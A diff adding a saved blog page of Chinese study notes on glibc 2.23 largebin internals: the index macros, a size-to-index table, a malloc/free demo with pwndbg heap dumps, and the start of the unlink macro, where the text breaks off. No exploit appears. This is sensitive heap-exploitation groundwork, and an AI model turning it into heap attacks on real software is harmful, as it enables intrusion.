@@ -1,0 +1,1310 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="some notes">
+<meta name="keywords" content="Heap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Largebin 学习">
+<meta property="og:url" content="https://veritas501.github.io/2018/04/11/Largebin 学习/index.html">
+<meta property="og:site_name" content="Veritas501&#39;s Blog">
+<meta property="og:description" content="some notes">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_b7786b9b6ec422f5ea5705f02a46ef5a.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_8e677b86fed88bb398543b8907263f20.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_cfee96c12a7576198a202af6ca81044f.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_b57936a49048da31941105ca710a9bd0.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_5db3e53910e3e161a552faeec8614493.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_b507b3c5e7b90a45acd42d820a545887.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_d5bdb96af0e85d2ed72b839f01db4b2b.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_52a5a7acb152cce2837fff77f1ede86d.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_d4faeb7eb24f7b747e790a6d011fca60.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_1adcc332cf761488a7448bcbf8a457de.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_1adcc332cf761488a7448bcbf8a457de.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_8025bba1cf199a063e59a0563c811f84.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_89d292406b70f4ebee639b02c28054df.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_f17ef0470dafd92ef3dd9e8f59b05809.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_2d2086edf2a91594187bbaac86bc2335.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_c41ed03f248338ba95628169f7efee0c.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_f4c3b32f4da41303193bf687309cde09.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_ae1a69a2103bce279a0c926645ff2d1a.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_33dda76b302781be8987ad449b695041.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_3558b71f33bb181412504c3a57708193.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_65863b0f14e2150443f3b3f9c629d11a.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_eaee60b78f1a8b57ab78aa0d746a1034.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_33dda76b302781be8987ad449b695041.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_61ce1562f412069f756564875a4b2ebb.png">
+<meta property="og:updated_time" content="2018-04-11T10:11:33.311Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Largebin 学习">
+<meta name="twitter:description" content="some notes">
+<meta name="twitter:image" content="http://ordvwjm69.bkt.clouddn.com/largebin_b7786b9b6ec422f5ea5705f02a46ef5a.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://veritas501.github.io/2018/04/11/Largebin 学习/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Largebin 学习 | Veritas501's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Veritas501's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-guestbook">
+    <a href="/Guestbook" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-pencil"></i> <br />guestbook</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://veritas501.github.io/2018/04/11/Largebin 学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Veritas501">
+      <meta itemprop="description" content="开始踏上Re&Pwn之路...">
+      <meta itemprop="image" content="/images/215.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veritas501's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Largebin 学习
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-04-11 00:00:00 / Modified: 18:11:33" itemprop="dateCreated datePublished" datetime="2018-04-11T00:00:00+08:00">2018-04-11</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/04/11/Largebin 学习/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2018/04/11/Largebin 学习/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/04/11/Largebin 学习/" class="leancloud_visitors" data-flag-title="Largebin 学习">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>some notes</p>
+<a id="more"></a>
+<hr>
+<p>all in glibc 2.23</p>
+<p>还是用index来归类,不过这次每个index下能放一定大小范围的堆块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#define largebin_index_32(sz)                                                \</span><br><span class="line">  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;&gt; 6) :\</span><br><span class="line">   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\</span><br><span class="line">   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\</span><br><span class="line">   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\</span><br><span class="line">   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\</span><br><span class="line">   126)</span><br><span class="line"></span><br><span class="line">#define largebin_index_32_big(sz)                                            \</span><br><span class="line">  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;&gt; 6) :\</span><br><span class="line">   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\</span><br><span class="line">   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\</span><br><span class="line">   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\</span><br><span class="line">   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\</span><br><span class="line">   126)</span><br><span class="line"></span><br><span class="line">// XXX It remains to be seen whether it is good to keep the widths of</span><br><span class="line">// XXX the buckets the same or whether it should be scaled by a factor</span><br><span class="line">// XXX of two as well.</span><br><span class="line">#define largebin_index_64(sz)                                                \</span><br><span class="line">  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;&gt; 6) :\</span><br><span class="line">   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\</span><br><span class="line">   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\</span><br><span class="line">   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\</span><br><span class="line">   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\</span><br><span class="line">   126)</span><br><span class="line"></span><br><span class="line">#define largebin_index(sz) \</span><br><span class="line">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span><br><span class="line">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span><br><span class="line">   : largebin_index_32 (sz))</span><br></pre></td></tr></table></figure>
+<p>通过测试可以发现largebin的idx为64~126,其中size和index有如下对应关系</p>
+<table>
+<thead>
+<tr>
+<th>size(区间左闭右开)</th>
+<th>index</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>[0x400 , 0x440)</td>
+<td>64</td>
+</tr>
+<tr>
+<td>[0x440 , 0x480)</td>
+<td>65</td>
+</tr>
+<tr>
+<td>[0x480 , 0x4C0)</td>
+<td>66</td>
+</tr>
+<tr>
+<td>[0x4C0 , 0x500)</td>
+<td>67</td>
+</tr>
+<tr>
+<td>[0x500 , 0x540)</td>
+<td>68</td>
+</tr>
+<tr>
+<td>等差 0x40</td>
+<td>…</td>
+</tr>
+<tr>
+<td>[0xC00 , 0xC40)</td>
+<td>96</td>
+</tr>
+<tr>
+<td>[0xC40 , 0xE00)</td>
+<td>97</td>
+</tr>
+<tr>
+<td>[0xE00 , 0x1000)</td>
+<td>98</td>
+</tr>
+<tr>
+<td>[0x1000 , 0x1200)</td>
+<td>99</td>
+</tr>
+<tr>
+<td>[0x1200 , 0x1400)</td>
+<td>100</td>
+</tr>
+<tr>
+<td>[0x1400 , 0x1600)</td>
+<td>101</td>
+</tr>
+<tr>
+<td>等差 0x200</td>
+<td>…</td>
+</tr>
+<tr>
+<td>[0x2800 , 0x2A00)</td>
+<td>111</td>
+</tr>
+<tr>
+<td>[0x2A00 , 0x3000)</td>
+<td>112</td>
+</tr>
+<tr>
+<td>[0x3000 , 0x4000)</td>
+<td>113</td>
+</tr>
+<tr>
+<td>[0x4000 , 0x5000)</td>
+<td>114</td>
+</tr>
+<tr>
+<td>等差 0x1000</td>
+<td>…</td>
+</tr>
+<tr>
+<td>[0x9000 , 0xA000)</td>
+<td>119</td>
+</tr>
+<tr>
+<td>[0xA000 , 0x10000)</td>
+<td>120</td>
+</tr>
+<tr>
+<td>[0x10000 , 0x18000)</td>
+<td>121</td>
+</tr>
+<tr>
+<td>[0x18000 , 0x20000)</td>
+<td>122</td>
+</tr>
+<tr>
+<td>[0x20000 , 0x28000)</td>
+<td>123</td>
+</tr>
+<tr>
+<td>[0x28000 , 0x40000)</td>
+<td>124</td>
+</tr>
+<tr>
+<td>[0x40000 , 0x80000)</td>
+<td>125</td>
+</tr>
+<tr>
+<td>[0x80000 , …. )</td>
+<td>126</td>
+</tr>
+</tbody>
+</table>
+<p>在每个index下,bins不再是像smallbin那样只根据free的顺序来排列,而是根据size从大到小来排列,如果size完全相同则按free的顺序来排列.</p>
+<p>假设现在有三个chunk,size分别为<code>A:0x400</code>,<code>B:0x400</code>,<code>C:0x410</code>,按照<code>free(A)</code>,<code>free(B)</code>,<code>free(C)</code>的顺序释放,最后arena中idx=64下的bins排列顺序为<code>C-&gt;A-&gt;B</code></p>
+<p>考虑以下代码:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> * A = <span class="built_in">malloc</span>(<span class="number">0x430</span><span class="number">-0x10</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">void</span> * B = <span class="built_in">malloc</span>(<span class="number">0x430</span><span class="number">-0x10</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">void</span> * C = <span class="built_in">malloc</span>(<span class="number">0x420</span><span class="number">-0x10</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">void</span> * D = <span class="built_in">malloc</span>(<span class="number">0x420</span><span class="number">-0x10</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">void</span> * E = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-0x10</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(A);</span><br><span class="line">	<span class="built_in">free</span>(B);</span><br><span class="line">	<span class="built_in">free</span>(C);</span><br><span class="line">	<span class="built_in">free</span>(D);</span><br><span class="line">	<span class="built_in">free</span>(E);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400: 0x602000 —▸ 0x602450 —▸ 0x6028a0 —▸ 0x602ce0 —▸ 0x603120 ◂— ...</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x604550</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x431,</span><br><span class="line">  fd = 0x602450,</span><br><span class="line">  bk = 0x7ffff7dd1f68,</span><br><span class="line">  fd_nextsize = 0x6028a0,</span><br><span class="line">  bk_nextsize = 0x603120,</span><br><span class="line">&#125;</span><br><span class="line">0x602430 &#123;</span><br><span class="line">  prev_size = 0x430,</span><br><span class="line">  size = 0x20,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x431,</span><br><span class="line">&#125;</span><br><span class="line">0x602450 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x431,</span><br><span class="line">  fd = 0x6028a0,</span><br><span class="line">  bk = 0x602000,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0,</span><br><span class="line">&#125;</span><br><span class="line">0x602880 &#123;</span><br><span class="line">  prev_size = 0x430,</span><br><span class="line">  size = 0x20,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x421,</span><br><span class="line">&#125;</span><br><span class="line">0x6028a0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x421,</span><br><span class="line">  fd = 0x602ce0,</span><br><span class="line">  bk = 0x602450,</span><br><span class="line">  fd_nextsize = 0x603120,</span><br><span class="line">  bk_nextsize = 0x602000,</span><br><span class="line">&#125;</span><br><span class="line">0x602cc0 &#123;</span><br><span class="line">  prev_size = 0x420,</span><br><span class="line">  size = 0x20,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x421,</span><br><span class="line">&#125;</span><br><span class="line">0x602ce0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x421,</span><br><span class="line">  fd = 0x603120,</span><br><span class="line">  bk = 0x6028a0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0,</span><br><span class="line">&#125;</span><br><span class="line">0x603100 &#123;</span><br><span class="line">  prev_size = 0x420,</span><br><span class="line">  size = 0x20,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x401,</span><br><span class="line">&#125;</span><br><span class="line">0x603120 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x401,</span><br><span class="line">  fd = 0x7ffff7dd1f68,</span><br><span class="line">  bk = 0x602ce0,</span><br><span class="line">  fd_nextsize = 0x602000,</span><br><span class="line">  bk_nextsize = 0x6028a0,</span><br><span class="line">&#125;</span><br><span class="line">0x603520 &#123;</span><br><span class="line">  prev_size = 0x400,</span><br><span class="line">  size = 0x20,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x1011,</span><br><span class="line">&#125;</span><br><span class="line">0x603540 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x1011,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0,</span><br><span class="line">&#125;</span><br><span class="line">0x604550 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x1eab1,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_b7786b9b6ec422f5ea5705f02a46ef5a.png" alt=""></p>
+<p>总结出如下规则(相同idx下)</p>
+<ul>
+<li>按照大小从大到小排序</li>
+<li>若大小相同,按照free时间排序</li>
+<li>若干个大小相同的堆块,只有首堆块的<code>fd_nextsize</code>和<code>bk_nextsize</code>会指向其他堆块,后面的堆块的<code>fd_nextsize</code>和<code>bk_nextsize</code>均为0</li>
+<li>size最大的chunk的<code>bk_nextsize</code>指向最小的chunk; size最小的chunk的<code>fd_nextsize</code>指向最大的chunk</li>
+</ul>
+<hr>
+<p><strong>看一下largebin的unlink</strong></p>
+<p>unlink原本的宏定义</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;								      \</span><br><span class="line">        FD-&gt;bk = BK;							      \</span><br><span class="line">        BK-&gt;fd = FD;							      \</span><br><span class="line">      